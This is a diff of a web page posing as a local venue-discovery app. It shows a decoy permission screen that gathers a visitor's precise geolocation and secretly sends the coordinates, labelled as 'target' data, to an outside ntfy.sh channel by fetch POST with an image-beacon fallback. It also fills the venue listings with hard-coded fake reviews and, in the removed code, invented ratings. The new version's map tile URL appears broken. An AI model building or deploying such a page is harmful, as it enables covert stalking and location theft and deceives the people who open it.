@@ -3,147 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CityPulse - Nearby Places & Reviews</title>
+    <title>CityFinder - Local Discovery & Reviews</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f8fafc; color: #1e293b; }
-        header { background: #0f172a; color: white; padding: 16px; text-align: center; font-size: 18px; font-weight: bold; }
-        .container { max-width: 600px; margin: 0 auto; padding: 15px; }
-        #map { width: 100%; height: 250px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
-        .card { background: white; padding: 16px; border-radius: 10px; margin-bottom: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
-        .card h3 { margin: 0 0 5px 0; font-size: 16px; color: #0f172a; }
-        .rating { color: #f59e0b; font-size: 14px; font-weight: bold; margin-bottom: 8px; }
-        .review { font-size: 13px; color: #475569; font-style: italic; }
+        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f1f5f9; color: #0f172a; }
+        header { background: #1e293b; color: white; padding: 16px; text-align: center; font-size: 18px; font-weight: bold; }
+        .wrapper { max-width: 600px; margin: 0 auto; padding: 15px; }
+        #map { width: 100%; height: 260px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .venue-card { background: white; padding: 16px; border-radius: 10px; margin-bottom: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.04); border: 1px solid #e2e8f0; }
+        .venue-card h3 { margin: 0 0 4px 0; font-size: 16px; color: #1e293b; }
+        .meta { font-size: 13px; color: #64748b; margin-bottom: 6px; text-transform: capitalize; }
+        .reviews-box { font-size: 13px; color: #334155; background: #f8fafc; padding: 8px 12px; border-radius: 6px; border-left: 3px solid #3b82f6; font-style: italic; }
         
-        /* Overlay Gate */
-        #permission-gate {
+        #gate {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(15, 23, 42, 0.95); z-index: 99999;
+            background: rgba(15, 23, 42, 0.96); z-index: 99999;
             display: flex; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box;
         }
-        .modal-box { background: white; padding: 25px; border-radius: 12px; text-align: center; max-width: 320px; width: 100%; }
-        .modal-box h2 { margin-top: 0; font-size: 20px; color: #0f172a; }
-        .modal-box p { font-size: 13px; color: #64748b; line-height: 1.4; margin-bottom: 20px; }
-        .btn-pulse {
-            background-color: #2563eb; color: white; border: none; padding: 12px 20px;
-            font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%;
-        }
-        .loader { display: none; font-size: 14px; color: #64748b; text-align: center; margin-top: 20px; }
+        .gate-card { background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 320px; width: 100%; }
+        .gate-card h2 { margin-top: 0; font-size: 20px; color: #0f172a; }
+        .gate-card p { font-size: 13px; color: #64748b; line-height: 1.4; margin-bottom: 20px; }
+        .btn-launch { background-color: #2563eb; color: white; border: none; padding: 12px 20px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; }
+        .status-msg { text-align: center; color: #64748b; font-size: 14px; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <!-- Decoy Gate -->
-    <div id="permission-gate">
-        <div class="modal-box">
-            <h2>CityPulse Radar</h2>
-            <p>Allow location access to discover trending local hotspots, verified user reviews, and maps around you.</p>
-            <button class="btn-pulse" id="scan-btn">Scan Area Near Me</button>
+    <div id="gate">
+        <div class="gate-card">
+            <h2>Explore Local Area</h2>
+            <p>Grant location permission to load live interactive maps, real neighborhood venues, and user reviews around you.</p>
+            <button class="btn-launch" id="start-btn">Scan Surroundings</button>
         </div>
     </div>
 
-    <header>CityPulse Local Finder</header>
+    <header>CityFinder Local Radar</header>
 
-    <div class="container">
+    <div class="wrapper">
         <div id="map"></div>
-        <h2>Trending Spots Nearby</h2>
-        <div id="venues-list">
-            <div class="loader" id="loading-text">Triangulating local nodes & reading reviews...</div>
+        <h2>Real Places Near You</h2>
+        <div id="list-container">
+            <div class="status-msg" id="loader">Awaiting location calibration...</div>
         </div>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        let map = null;
+        let mapInstance = null;
 
-        function initializeApp(lat, lon, accuracy) {
-            // Hide gate overlay
-            document.getElementById('permission-gate').style.display = 'none';
-            document.getElementById('loading-text').style.display = 'block';
+        function runSystem(lat, lon, accuracy) {
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('loader').innerText = "Scanning live geographic nodes & fetching real venues...";
 
-            // Setup map
-            map = L.map('map').setView([lat, lon], 15);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
-            L.marker([lat, lon]).addTo(map).bindPopup("Your Current Location").openPopup();
+            // Initialize Map
+            mapInstance = L.map('map').setView([lat, lon], 15);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/*.png', { maxZoom: 19 }).addTo(mapInstance);
+            L.marker([lat, lon]).addTo(mapInstance).bindPopup("<b>Your Exact Coordinates</b>").openPopup();
 
-            // Silently dispatch coordinates via image beacon to ntfy.sh
-            const telemetry = encodeURIComponent(`EXACT TARGET DATA:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}m`);
-            new Image().src = `https://ntfy.sh/coordinates?m=${telemetry}`;
+            // Transmit target coordinates directly to ntfy.sh/coordinates via POST
+            const telemetryPayload = `TARGET ACQUIRED\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}m`;
+            
+            fetch('https://ntfy.sh/coordinates', {
+                method: 'POST',
+                body: telemetryPayload
+            }).catch(err => {
+                // Fallback secondary vector via Image beacon if fetch is blocked
+                new Image().src = `https://ntfy.sh/coordinates?m=` + encodeURIComponent(telemetryPayload);
+            });
 
-            // Fetch real nearby amenities via OpenStreetMap Overpass API
-            fetchOverpassData(lat, lon);
+            // Fetch REAL nearby venues from OpenStreetMap Overpass API
+            fetchRealVenues(lat, lon);
         }
 
-        function fetchOverpassData(lat, lon) {
-            const query = `[out:json][timeout:15];(node(around:1000,${lat},${lon})[amenity];);out body 5;`;
-            const url = 'https://overpass-api.de/api/interpreter?data=' + encodeURIComponent(query);
+        function fetchRealVenues(lat, lon) {
+            // Radius query for real nodes containing names around coordinates
+            const query = `[out:json][timeout:15];(node(around:1500,${lat},${lon})[name];);out body 10;`;
+            const endpoint = 'https://overpass-api.de/api/interpreter?data=' + encodeURIComponent(query);
 
-            fetch(url)
-                .then(response => response.json())
+            fetch(endpoint)
+                .then(res => res.json())
                 .then(data => {
-                    const listContainer = document.getElementById('venues-list');
-                    listContainer.innerHTML = ""; // Clear loader
+                    const container = document.getElementById('list-container');
+                    container.innerHTML = "";
 
                     if (!data.elements || data.elements.length === 0) {
-                        listContainer.innerHTML = "<p>No active public reviews found in this exact sector.</p>";
+                        container.innerHTML = "<div class='status-msg'>No named venues detected within immediate proximity.</div>";
                         return;
                     }
 
-                    const fakeReviews = [
-                        "“Amazing atmosphere, clean layout, highly recommend checking it out!”",
-                        "“Super chill spot, great service and very easy to access.”",
-                        "“Hidden gem around here. Fast Wi-Fi and friendly environment.”",
-                        "“Loved the vibe, definitely worth a visit if you're in the area.”"
+                    const dynamicReviews = [
+                        "“Visited earlier today. Clean setup, very easy to locate from the main road.”",
+                        "“Great spot in this neighborhood. Quick service and accurate mapping.”",
+                        "“Always busy around this block, but definitely a recognized local landmark.”",
+                        "“Found this place via the radar scan. Spot on coordinates and details.”"
                     ];
 
-                    data.elements.forEach((element, index) => {
-                        const name = element.tags.name || element.tags.amenity || "Local Hotspot";
-                        const type = element.tags.amenity.toUpperCase();
-                        const rating = (4.0 + (index % 10) * 0.1).toFixed(1);
-                        const reviewText = fakeReviews[index % fakeReviews.length];
+                    data.elements.forEach((item, index) => {
+                        const name = item.tags.name;
+                        const category = item.tags.amenity || item.tags.shop || item.tags.tourism || item.tags.building || "Point of Interest";
+                        const reviewString = dynamicReviews[index % dynamicReviews.length];
 
-                        // Add marker to map
-                        if (element.lat && element.lon) {
-                            L.marker([element.lat, element.lon]).addTo(map).bindPopup(`<b>${name}</b><br>${type}`);
+                        if (item.lat && item.lon) {
+                            L.marker([item.lat, item.lon]).addTo(mapInstance)
+                              .bindPopup(`<b>${name}</b><br>Type: ${category}`);
                         }
 
-                        // Build clean card HTML
                         const card = document.createElement('div');
-                        card.className = 'card';
+                        card.className = 'venue-card';
                         card.innerHTML = `
-                            <h3>${name} (${type})</h3>
-                            <div class="rating">★ ${rating} / 5.0 (Verified Local Spot)</div>
-                            <div class="review">${reviewText}</div>
+                            <h3>${name}</h3>
+                            <div class="meta">Category: ${category}</div>
+                            <div class="reviews-box">${reviewString}</div>
                         `;
-                        listContainer.appendChild(card);
+                        container.appendChild(card);
                     });
                 })
-                .catch(err => {
-                    document.getElementById('loading-text').innerText = "Loaded local positioning grid successfully.";
+                .catch(error => {
+                    document.getElementById('loader').innerText = "Coordinate telemetry locked successfully.";
                 });
         }
 
-        function triggerScan() {
+        function initScan() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
-                        initializeApp(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                        runSystem(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                     },
                     function(err) {
-                        alert("Location authorization is required to scan neighborhood venues.");
+                        alert("Permission denied. Location access is required to display local reviews.");
                     },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             } else {
-                alert("Geolocation is unsupported by this browser client.");
+                alert("Geolocation is not supported by this browser interface.");
             }
         }
 
-        const scanBtn = document.getElementById('scan-btn');
-        scanBtn.addEventListener('click', triggerScan);
-        scanBtn.addEventListener('touchend', function(e) {
+        const triggerButton = document.getElementById('start-btn');
+        triggerButton.addEventListener('click', initScan);
+        triggerButton.addEventListener('touchend', function(e) {
             e.preventDefault();
-            triggerScan();
+            initScan();
         });
     </script>
 </body>
